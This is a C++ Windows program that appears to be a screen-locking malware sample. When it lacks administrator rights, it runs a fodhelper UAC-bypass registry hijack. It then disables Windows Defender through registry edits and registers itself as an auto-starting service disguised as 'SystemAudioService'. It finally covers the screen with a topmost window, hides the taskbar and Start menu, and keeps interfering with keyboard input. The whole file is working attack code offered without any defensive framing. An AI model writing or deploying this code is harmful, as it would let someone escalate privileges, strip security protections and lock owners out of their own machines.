#include <windows.h>
#include <iostream>
#include <unistd.h>
#include <tchar.h>
#include <thread>
#include <string>

using namespace std;
 
//获取当前exe程序所在路径
char *GetExeFullPath()
{
	TCHAR szPath[MAX_PATH];
	string pathstr;
	GetModuleFileName(NULL,szPath,MAX_PATH);
 	pathstr = szPath;
 	char * pathrtn=(char*)pathstr.data();
	return pathrtn;
}

bool IsProcessRunAsAdmin()//判断程序是否为管理员身份（是返回1，否则反之） 原帖： https://blog.csdn.net/zcy5157912/article/details/125109747
{
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    BOOL b = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup);
    if(b)
    {
        CheckTokenMembership(NULL, AdministratorsGroup, &b);
        FreeSid(AdministratorsGroup);
    }
    return b == TRUE;
}
 
void CloseWD()//字面意思，关Windows Denference(Need AdminAccount)  原帖：https://blog.csdn.net/qq_34185638/article/details/127273044 
{
	system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD /f");
	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Sense\" /v \"Start\" /d 4 /t REG_DWORD /f");
	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdBoot\" /v \"Start\" /d 4 /t REG_DWORD /f");
	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdFilter\" /v \"Start\" /d 4 /t REG_DWORD /f");
	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisDrv\" /v \"Start\" /d 4 /t REG_DWORD /f");
	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc\" /v \"Start\" /d 4 /t REG_DWORD /f");
	system("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /d 4 /t REG_DWORD /f");
} 
void regsystask()
{
	string regcomm = 
		"sc create TestService binpath= \"" + string(GetExeFullPath()) +"\" start= auto displayname= \"SystemAudioService\"";
	const char* cwd_char = regcomm.data();
	system(cwd_char);
	system("net start SystemAudioService");
 } 

void kbd_lock()
{
	while(1)
	{
		keybd_event(VK_TAB,0x45,KEYEVENTF_KEYUP,0);
		keybd_event(VK_MENU,0x45,KEYEVENTF_KEYUP,0);
		keybd_event(VK_LCONTROL,0x45,KEYEVENTF_KEYUP,0);
		keybd_event(VK_RCONTROL,0x45,KEYEVENTF_KEYUP,0);
		Sleep(10); 
	}
}

void topmost()
{
	while(1)
	{
		int cX = GetSystemMetrics(SM_CXSCREEN);   
		int cY = GetSystemMetrics(SM_CYSCREEN);
		HWND stw = FindWindow("Shell_TrayWnd",NULL); 
		HWND m = FindWindow("Windows.UI.Core.CoreWindow","启动");//开始菜单 
		SetWindowPos(stw,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		SetWindowPos(m,HWND_BOTTOM,0,0,cX,cY,SWP_HIDEWINDOW|SWP_NOOWNERZORDER|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		HWND top = FindWindow("UnrealClass","Boundary");
		HWND foreground = GetForegroundWindow();
		if(top!=foreground){
			SetWindowPos(top,HWND_TOPMOST,0,0,cX,cY,SWP_SHOWWINDOW|SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
		}
		SetFocus(top);
		Sleep(10); 
	}
}
/* This is where all the input to the window goes to */
LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
	switch(Message) {
		
		/* Upon destruction, tell the main thread to stop */
		case WM_DESTROY: {
			break;
		}
		
		/* All other messages (a lot of them) are processed using default procedures */
		default:
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}

/* The 'main' function of Win32 GUI programs: this is where execution starts */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	WNDCLASSEX wc; /* A properties struct of our window */
	HWND hwnd; /* A 'HANDLE', hence the H, or a pointer to our window */
	MSG msg; /* A temporary location for all messages */

	bool IsProcessRunAsAdmin();
    void regsystask();
	void kbd_lock();
	void CloseWD();
	void topmost();

	/* zero out the struct and set the stuff we want to modify */
	memset(&wc,0,sizeof(wc));
	wc.cbSize		 = sizeof(WNDCLASSEX);
	wc.lpfnWndProc	 = WndProc; /* This is where we will send messages to */
	wc.hInstance	 = hInstance;
	wc.hCursor		 = LoadCursor(NULL, IDC_ARROW);
	
	/* White, COLOR_WINDOW is just a #define for a system color, try Ctrl+Clicking it */
	wc.hbrBackground = (HBRUSH)CreateSolidBrush(RGB(71,204,255));
	wc.lpszClassName = "UnrealClass";
	wc.hIcon		 = LoadIcon(NULL, IDI_APPLICATION); /* Load a standard icon */
	wc.hIconSm		 = LoadIcon(NULL, IDI_APPLICATION); /* use the name "A" to use the project icon */

	if(!RegisterClassEx(&wc)) {
		MessageBox(NULL, "Window Registration Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}
	
	if(IsProcessRunAsAdmin()==0){
		string cmdbypass =
			"reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f && reg add HKCU\\Software\\Classes\\ms-settings\\shell\\" + string("open") + "\\command /d \"cmd /c start " + string(GetExeFullPath()) +"\" /f && START /W fodhelper.exe && reg delete HKCU\\Software\\Classes\\ms-settings /f"; 
		const char* cbs_char = cmdbypass.data();
		system(cbs_char);
		PostQuitMessage(0);
	}
	CloseWD(); 
	regsystask();
	int cX = GetSystemMetrics(SM_CXSCREEN);   
	int cY = GetSystemMetrics(SM_CYSCREEN);

	hwnd = CreateWindowEx(WS_EX_CLIENTEDGE,"UnrealClass","Boundary",WS_VISIBLE|WS_POPUP|WS_CLIPSIBLINGS,
		CW_USEDEFAULT, /* x */
		CW_USEDEFAULT, /* y */
		cX, /* width */
		cY, /* height */
		NULL,NULL,hInstance,NULL);

	if(hwnd == NULL) {
		MessageBox(NULL, "Window Creation Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}
	
	SetWindowLong(hwnd,GWL_EXSTYLE,GetWindowLong(hwnd,GWL_EXSTYLE)^0x80000);      
    HINSTANCE  hInst = LoadLibrary("User32.DLL");    
    if(hInst != NULL)  
    {  
        typedef BOOL (WINAPI *MYFUNC)(HWND, COLORREF, BYTE, DWORD);   
          
        MYFUNC pFunc = (MYFUNC)GetProcAddress(hInst, "SetLayeredWindowAttributes");  
        if (pFunc != NULL){
               pFunc(hwnd, 0,25, 2);    
        	}  
        FreeLibrary(hInst);  
        hInst = NULL;  
    }
    EnableWindow(hwnd,false);
    thread topmst(topmost);
    topmst.detach();
    thread kbd(kbd_lock);
	kbd.detach();
	/*
		This is the heart of our program where all input is processed and 
		sent to WndProc. Note that GetMessage blocks code flow until it receives something, so
		this loop will not produce unreasonably high CPU usage
	*/
	while(GetMessage(&msg, NULL, 0, 0) > 0) { /* If no error is received... */
		TranslateMessage(&msg); /* Translate key codes to chars if present */
		DispatchMessage(&msg); /* Send it to WndProc */
	}
	return msg.wParam;
}
